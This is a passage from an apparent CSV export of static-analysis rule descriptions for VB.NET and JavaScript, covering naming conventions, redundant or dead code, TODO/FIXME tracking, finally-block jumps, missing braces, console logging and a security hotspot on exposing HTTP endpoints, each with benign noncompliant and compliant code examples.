    Sub GetSomething(ByVal ID As Integer) ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub GetSomething(ByVal id As Integer) ' Compliant
    End Sub
End Module
</pre>",vbnet:S1654,vbnet,VB.NET,"<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate.</p>
<p>This rule allows to check that all parameter names match a provided regular expression.</p>
<p>The default configuration is the one recommended by Microsoft:</p>
<ul>
  <li> Camel casing, starting with a lower case character, e.g. backColor </li>
  <li> Short abbreviations of 2 letters can be capitalized only when not at the beginning, e.g. id, productID </li>
  <li> Longer abbreviations need to be lower cased, e.g. html </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$</code></p>
<pre>
Module Module1
    Sub GetSomething(ByVal ID As Integer) ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub GetSomething(ByVal id As Integer) ' Compliant
    End Sub
End Module
</pre>",Method parameters should follow a naming convention,"[{'key': 'format', 'htmlDesc': 'Regular expression used to check the parameter names against.', 'defaultValue': '^[a-z][a-z0-9]*([A-Z]{1,3}[a-z0-9]+)*([A-Z]{2})?$', 'type': 'STRING'}]",MAJOR,['convention'],CODE_SMELL
2016-11-07T15:36:18+0100,"<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub SetName(name As String)
  name = name
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub SetName(name As String)
  Me.name = name
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",vbnet:S1656,vbnet,VB.NET,"<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub SetName(name As String)
  name = name
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub SetName(name As String)
  Me.name = name
End Sub
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Variables should not be self-assigned,[],MAJOR,['cert'],BUG
2016-11-07T15:36:18+0100,"<p>Declaring multiple variable on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
  Public Const AAA As Integer = 5, BBB = 42, CCC As String = ""foo""  ' Noncompliant
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Public Const AAA As Integer = 5
  Public Const BBB = 42
  Public Const CCC as String = ""foo""
End Module
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 8-0-1 - An init-declarator-list or a member-declarator-list shall consist of a single init-declarator or member-declarator
  respectively </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7wHEAw"">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VgU"">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>",vbnet:S1659,vbnet,VB.NET,"<p>Declaring multiple variable on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
  Public Const AAA As Integer = 5, BBB = 42, CCC As String = ""foo""  ' Noncompliant
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
  Public Const AAA As Integer = 5
  Public Const BBB = 42
  Public Const CCC as String = ""foo""
End Module
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 8-0-1 - An init-declarator-list or a member-declarator-list shall consist of a single init-declarator or member-declarator
  respectively </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7wHEAw"">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VgU"">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>",Multiple variables should not be declared on the same line,[],MINOR,"['cert', 'convention', 'misra']",CODE_SMELL
2017-04-27T12:27:57+0200,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",javascript:S2589,js,JavaScript,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Boolean expressions should not be gratuitous,[],MAJOR,"['cert', 'cwe', 'misra', 'redundant']",CODE_SMELL
2014-01-24T08:40:40+0100,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",javascript:S1135,js,JavaScript,"<p><code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  // TODO
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""TODO"" tags",[],INFO,['cwe'],CODE_SMELL
2014-01-24T08:40:40+0100,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide(numerator, denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>",javascript:S1134,js,JavaScript,"<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide(numerator, denominator) {
  return numerator / denominator;              // FIXME denominator value might be  0
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/546.html"">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>","Track uses of ""FIXME"" tags",[],MAJOR,['cwe'],CODE_SMELL
2016-04-07T17:33:04+0200,"<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never
be used in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = false;
if (a) { // Noncompliant
  doSomething(); // never executed
}

if (!a || b) { // Noncompliant; ""!a"" is always ""true"", ""b"" is never evaluated
  doSomething();
} else {
  doSomethingElse(); // never executed
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",javascript:S2583,js,JavaScript,"<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never
be used in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = false;
if (a) { // Noncompliant
  doSomething(); // never executed
}

if (!a || b) { // Noncompliant; ""!a"" is always ""true"", ""b"" is never evaluated
  doSomething();
} else {
  doSomethingElse(); // never executed
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Conditionally executed blocks should be reachable,[],MAJOR,"['cert', 'cwe', 'misra', 'pitfall', 'unused']",BUG
2019-03-04T09:37:21+0100,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<pre>
// === NodeJS built-in modules ===
const http = require('http');
const https = require('https');

// Endpoints exposed by http.Server and https.Server objects are security-sensitive and should be reviewed.
// Examples:

const srv = new http.Server((req, res) =&gt; {});
srv.listen(3000); // Questionable

// http.createServer creates a new http.Server object.
const srv = http.createServer((req, res) =&gt; {});
srv.listen(3000); // Questionable

const srv = new https.Server((req, res) =&gt; {});
srv.listen(3000); // Questionable

// https.createServer creates a new https.Server object.
const srv = https.createServer((req, res) =&gt; {});
srv.listen(3000); // Questionable
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const app = express();

// Endpoints exposed by ExpressJS are security-sensitive and should be reviewed.
// Example:

app.get('/', function (req, res) {});
app.post('/', function (req, res) {});
app.all('/', function (req, res) {});
app.listen(3000); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",javascript:S4529,js,JavaScript,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint. It guides security code reviews to security-sensitive code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<pre>
// === NodeJS built-in modules ===
const http = require('http');
const https = require('https');

// Endpoints exposed by http.Server and https.Server objects are security-sensitive and should be reviewed.
// Examples:

const srv = new http.Server((req, res) =&gt; {});
srv.listen(3000); // Questionable

// http.createServer creates a new http.Server object.
const srv = http.createServer((req, res) =&gt; {});
srv.listen(3000); // Questionable

const srv = new https.Server((req, res) =&gt; {});
srv.listen(3000); // Questionable

// https.createServer creates a new https.Server object.
const srv = https.createServer((req, res) =&gt; {});
srv.listen(3000); // Questionable
</pre>
<pre>
// === ExpressJS ===
const express = require('express');
const app = express();

// Endpoints exposed by ExpressJS are security-sensitive and should be reviewed.
// Example:

app.get('/', function (req, res) {});
app.post('/', function (req, res) {});
app.all('/', function (req, res) {});
app.listen(3000); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/352.html"">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/22.html"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Exposing HTTP endpoints is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'owasp-a7', 'sans-top25-insecure', 'sans-top25-porous', 'sans-top25-risky', 'spring']",SECURITY_HOTSPOT
2015-04-07T09:32:39+0200,"<p>Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you
run the risk of inadvertently exposing sensitive information, slowing down the browser, or even erroring-out the site for some users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
console.log(password_entered); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",javascript:S2228,js,JavaScript,"<p>Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you
run the risk of inadvertently exposing sensitive information, slowing down the browser, or even erroring-out the site for some users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
console.log(password_entered); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",Console logging should not be used,[],MINOR,"['owasp-a3', 'user-experience']",VULNERABILITY
2014-01-24T08:40:40+0100,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {  // Noncompliant
  doSomething();
}
...
if (false) {  // Noncompliant
  doSomethingElse();
}

if (!options || options === true) { doThirdThing(); }  // Noncompliant; always true
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();

doThirdThing();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS2583'>S2583</a> instead.</p>",javascript:S1145,js,JavaScript,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {  // Noncompliant
  doSomething();
}
...
if (false) {  // Noncompliant
  doSomethingElse();
}

if (!options || options === true) { doThirdThing(); }  // Noncompliant; always true
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();

doThirdThing();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use {rule:javascript:S2583} instead.</p>","Useless ""if(true) {...}"" and ""if(false){...}"" blocks should be removed",[],MAJOR,"['cwe', 'misra']",BUG
2016-11-17T16:15:09+0100,"<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and <code>continue</code> from a <code>finally</code> block overwrites similar
statements from the suspended <code>try</code> and <code>catch</code> blocks.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code> and <code>throw</code>) would force
control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    } finally {
        return 3; // Noncompliant: 3 is returned before 1, or 2, which we did not expect
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/584.html"">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mIEbAQ"">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>",javascript:S1143,js,JavaScript,"<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and <code>continue</code> from a <code>finally</code> block overwrites similar
statements from the suspended <code>try</code> and <code>catch</code> blocks.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code> and <code>throw</code>) would force
control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    } finally {
        return 3; // Noncompliant: 3 is returned before 1, or 2, which we did not expect
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/584.html"">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mIEbAQ"">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>","Jump statements should not occur in ""finally"" blocks",[],CRITICAL,"['cert', 'cwe', 'error-handling']",BUG
2016-01-15T13:56:35+0100,"<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs. </p>
<p>This rule raises an issue when the indentation of the lines after a one-line block indicates an intent to include those lines in the block, but the
omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/483.html"">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>",javascript:S2681,js,JavaScript,"<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs. </p>
<p>This rule raises an issue when the indentation of the lines after a one-line block indicates an intent to include those lines in the block, but the
omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

String str = null;
for (int i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/483.html"">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3wHEAw"">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
